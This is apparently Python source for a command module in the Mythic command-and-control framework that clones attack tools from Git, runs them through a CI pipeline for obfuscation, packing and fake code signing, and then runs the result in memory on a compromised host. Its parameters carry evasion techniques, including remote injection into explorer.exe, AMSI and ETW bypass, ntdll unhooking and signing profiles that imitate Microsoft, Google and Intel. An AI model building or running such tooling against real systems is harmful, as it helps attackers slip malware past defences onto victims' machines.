from __future__ import annotations

import json
import logging
import os

from mythic_container.MythicCommandBase import (
    CommandBase,
    CommandAttributes,
    CommandParameter,
    ParameterGroupInfo,
    ParameterType,
    PTTaskMessageAllData,
    PTTaskCreateTaskingMessageResponse,
    TaskArguments,
)
from mythic_container.MythicGoRPC import (
    SendMythicRPCCallbackSearch,
    SendMythicRPCFileCreate,
    SendMythicRPCResponseCreate,
    MythicRPCCallbackSearchMessage,
    MythicRPCFileCreateMessage,
    MythicRPCResponseCreateMessage,
)

from daedalus.providers import get_provider, BuildStatus
from daedalus.eventing import _poll_build
from daedalus_ca.secrets import resolve_provider_kwargs, resolve_secret, REPO_TOKEN
from daedalus_ca.shared import load_agent_support, select_artifact, provider_credential_parameters

logger = logging.getLogger("daedalus_ca.obfuscate_build")


class ObfuscateBuildArguments(TaskArguments):
    def __init__(self, command_line: str, task_id: int = 0, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="repo_url",
                type=ParameterType.String,
                description="Git clone URL for source (e.g. https://github.com/nicocha30/ligolo-ng)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=1),
                ],
            ),
            CommandParameter(
                name="language",
                type=ParameterType.ChooseOneCustom,
                description="Source language (build toolchain selection)",
                choices=["c-mingw", "csharp", "rust", "go", "nim", "cpp-mingw"],
                default_value="c-mingw",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=2),
                ],
            ),
            CommandParameter(
                name="obfuscation",
                type=ParameterType.ChooseOneCustom,
                description="Obfuscation level (garble for Go, ConfuserEx for .NET, calypso for PE packing)",
                choices=["none", "basic", "full", "garble", "calypso"],
                default_value="full",
                parameter_group_info=[
                    ParameterGroupInfo(required=True, ui_position=3),
                ],
            ),
            CommandParameter(
                name="provider",
                type=ParameterType.ChooseOneCustom,
                description="CI/CD provider (credentials resolved from Mythic Secrets)",
                choices=["jenkins", "github", "gitlab", "forgejo", "gitea"],
                default_value="jenkins",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=4),
                ],
            ),
            CommandParameter(
                name="job",
                type=ParameterType.String,
                description="CI job/workflow name (auto-resolved from language if empty)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=5),
                ],
            ),
            CommandParameter(
                name="output_format",
                type=ParameterType.ChooseOneCustom,
                description="Output binary format",
                choices=["exe", "dll", "bin", "shellcode", "svc"],
                default_value="exe",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=6),
                ],
            ),
            CommandParameter(
                name="tool_type",
                type=ParameterType.ChooseOne,
                description="How to handle the compiled output",
                choices=["register_only", "bof", "assembly"],
                default_value="register_only",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=7),
                ],
            ),
            CommandParameter(
                name="source_path",
                type=ParameterType.String,
                description="Path within the repo to compile (e.g. cmd/agent)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=8),
                ],
            ),
            CommandParameter(
                name="ref",
                type=ParameterType.String,
                description="Git branch or tag to build from",
                default_value="main",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=9),
                ],
            ),
            CommandParameter(
                name="repo_token",
                type=ParameterType.String,
                description="Access token for private repos (set REPO_TOKEN in Mythic Secrets instead)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=10),
                ],
            ),
            CommandParameter(
                name="packer_flags",
                type=ParameterType.String,
                description="Calypso packer flags (e.g. --inject remote --execute apc --process explorer.exe --syscall indirect --cipher aes-cbc --amsi hwbp --etw hwbp --sleep 10 --unhook ntdll.dll)",
                default_value="",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=11),
                ],
            ),
            CommandParameter(
                name="signing_profile",
                type=ParameterType.ChooseOne,
                description="Code signing profile (Limelighter)",
                choices=["none", "microsoft", "google", "intel", "custom"],
                default_value="none",
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=12),
                ],
            ),
            CommandParameter(
                name="timeout",
                type=ParameterType.Number,
                description="Build timeout in seconds",
                default_value=300,
                parameter_group_info=[
                    ParameterGroupInfo(required=False, ui_position=13),
                ],
            ),
            *provider_credential_parameters(),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)

    async def parse_dictionary(self, dictionary: dict):
        self.load_args_from_dictionary(dictionary)


class ObfuscateBuild(CommandBase):
    cmd = "daedalus_obfuscate_build"
    description = (
        "Pull source from a Git repo, trigger a CI/CD obfuscation pipeline, "
        "then execute in-memory or register as a tool. Credentials are resolved "
        "from Mythic Secrets automatically."
    )
    help_cmd = (
        "daedalus_obfuscate_build -repo_url https://github.com/nicocha30/ligolo-ng "
        "-language go -obfuscation garble"
    )
    author = "@Lavender-exe"
    version = 4
    script_only = True
    argument_class = ObfuscateBuildArguments
    attackmapping = ["T1027", "T1059", "T1105"]
    attributes = CommandAttributes(
        spawn_and_injectable=False,
        builtin=True,
        suggested_command=True,
        load_only=False,
    )

    async def create_go_tasking(
        self, taskData: PTTaskMessageAllData
    ) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        try:
            provider_name = (taskData.args.get_arg("provider") or os.getenv("DAEDALUS_PROVIDER", "jenkins")).lower()
            job = taskData.args.get_arg("job") or ""
            language = taskData.args.get_arg("language") or "c-mingw"
            output_format = taskData.args.get_arg("output_format") or "exe"
            obfuscation = taskData.args.get_arg("obfuscation") or "full"
            source_path = taskData.args.get_arg("source_path") or ""
            ref = taskData.args.get_arg("ref") or "main"
            tool_type = taskData.args.get_arg("tool_type") or "register_only"
            packer_flags = taskData.args.get_arg("packer_flags") or ""
            signing_profile = taskData.args.get_arg("signing_profile") or "none"
            raw_timeout = taskData.args.get_arg("timeout") or 300
            timeout = int(raw_timeout) if raw_timeout else 300

            repo_url = taskData.args.get_arg("repo_url") or os.getenv("REPO_URL", "")
            repo_token = resolve_secret(taskData, "repo_token", "REPO_TOKEN", REPO_TOKEN)

            if not job:
                job = "daedalus-tooling-build"
                logger.warning("Job auto-resolved to shared tooling pipeline: %s", job)

            kwargs = resolve_provider_kwargs(taskData, provider_name)
            provider = get_provider(provider_name, **kwargs)

            source_display = repo_url or job
            pipeline_info = f"lang={language}, fmt={output_format}, obf={obfuscation}"
            if signing_profile != "none":
                pipeline_info += f", sign={signing_profile}"
            if packer_flags:
                pipeline_info += f", packer={packer_flags}"
            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Starting obfuscation pipeline:\n"
                    f"  Source: {source_display}/{source_path} @ {ref}\n"
                    f"  Provider: {provider_name}\n"
                    f"  Pipeline: {job} ({pipeline_info})\n"
                ).encode(),
            ))

            # --- Phase 1: Trigger build with obfuscation parameters ---
            build_params = {
                "LANGUAGE": language,
                "OUTPUT_FORMAT": output_format,
                "OBFUSCATION": obfuscation,
            }
            if repo_url:
                build_params["REPO_URL"] = repo_url
            if repo_token:
                build_params["REPO_TOKEN"] = repo_token
            if source_path:
                build_params["SOURCE_PATH"] = source_path
            if ref:
                build_params["REF"] = ref
            if packer_flags:
                build_params["PACKER_FLAGS"] = packer_flags
            if signing_profile and signing_profile != "none":
                build_params["SIGNING_PROFILE"] = signing_profile

            build_result = await provider.trigger_build(job, build_params)
            if not build_result.build_id:
                raise RuntimeError(f"Build trigger failed: {build_result.error or 'no build ID returned'}")

            build_id = build_result.build_id
            logger.warning("Build triggered: %s/%s #%s", provider_name, job, build_id)

            # --- Phase 2: Poll build until completion ---
            build_result = await _poll_build(provider, job, build_id, timeout)

            if build_result.status == BuildStatus.UNKNOWN:
                raise RuntimeError(f"Build timed out after {timeout}s")
            if build_result.status != BuildStatus.SUCCESS:
                raise RuntimeError(f"Build failed with status: {build_result.status.value}")

            logger.warning("Build %s/%s #%s completed: %s", provider_name, job, build_id, build_result.status.value)

            # --- Phase 3: Download artifact ---
            artifact_name = ""
            artifacts = await provider.list_artifacts(job, build_id)
            if artifacts:
                selected = select_artifact(artifacts)
                if selected:
                    artifact_name = selected["relativePath"]

            if not artifact_name:
                artifact_name = job

            artifact_bytes = await provider.download_artifact(job, build_id, artifact_name)
            logger.warning("Downloaded %s (%d bytes)", artifact_name, len(artifact_bytes))

            # --- Phase 4: Upload to Mythic ---
            delete_after = tool_type != "register_only"
            file_resp = await SendMythicRPCFileCreate(MythicRPCFileCreateMessage(
                TaskID=taskData.Task.ID,
                FileContents=artifact_bytes,
                Filename=os.path.basename(artifact_name),
                DeleteAfterFetch=delete_after,
                Comment=f"Daedalus CA: obfuscated build from {source_display}/{source_path} ({obfuscation})",
            ))
            if not file_resp.Success:
                raise RuntimeError(f"File upload failed: {file_resp.Error}")

            agent_file_id = file_resp.AgentFileId
            logger.warning("Uploaded to Mythic: %s", agent_file_id)

            if tool_type == "register_only":
                await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                    TaskID=taskData.Task.ID,
                    Response=(
                        f"Obfuscated {artifact_name} ({len(artifact_bytes)} bytes) registered\n"
                        f"Source: {source_display}/{source_path} @ {ref}\n"
                        f"Pipeline: {provider_name}/{job} #{build_id} (obf={obfuscation})\n"
                        f"File ID: {agent_file_id}"
                    ).encode(),
                ))
                response.DisplayParams = f"[registered] {artifact_name} ({obfuscation})"
                response.Completed = True
                return response

            # --- Phase 5: Delegate to target agent ---
            support = load_agent_support()
            callback_resp = await SendMythicRPCCallbackSearch(MythicRPCCallbackSearchMessage(
                CallbackID=taskData.Task.CallbackID,
            ))

            target_payload_type = taskData.PayloadType
            if not target_payload_type and callback_resp.Success and callback_resp.Results:
                target_payload_type = getattr(callback_resp.Results[0], "PayloadType", "") or ""

            agent_cfg = support.get(target_payload_type, {})

            if tool_type == "bof":
                native_cmd = agent_cfg.get("bof_command", "execute_coff")
                file_param = agent_cfg.get("bof_file_parameter_name", "bof_file")
                params = {file_param: agent_file_id}
            elif tool_type == "assembly":
                default_method = agent_cfg.get("assembly_default_execution_method", "execute_assembly")
                native_cmd = agent_cfg.get(f"{default_method}_command", "execute_assembly")
                file_param = agent_cfg.get(f"{default_method}_file_parameter_name", "assembly_file")
                params = {file_param: agent_file_id}
            else:
                raise ValueError(f"Unknown tool_type: {tool_type}")

            response.DisplayParams = f"[{tool_type}] {artifact_name} ({obfuscation}) from {source_display}"
            response.CommandName = native_cmd
            response.ReprocessAtNewCommandPayloadType = target_payload_type
            response.Params = json.dumps(params)

            await SendMythicRPCResponseCreate(MythicRPCResponseCreateMessage(
                TaskID=taskData.Task.ID,
                Response=(
                    f"Obfuscated {artifact_name} ({len(artifact_bytes)} bytes)\n"
                    f"Source: {source_display}/{source_path} @ {ref}\n"
                    f"Pipeline: {provider_name}/{job} #{build_id} (obf={obfuscation})\n"
                    f"Delegating to {target_payload_type}/{native_cmd}\n"
                ).encode(),
            ))

        except Exception as e:
            logger.error("obfuscate_build failed: %s", e, exc_info=True)
            response.Success = False
            response.Error = str(e)
            response.Completed = True

        return response
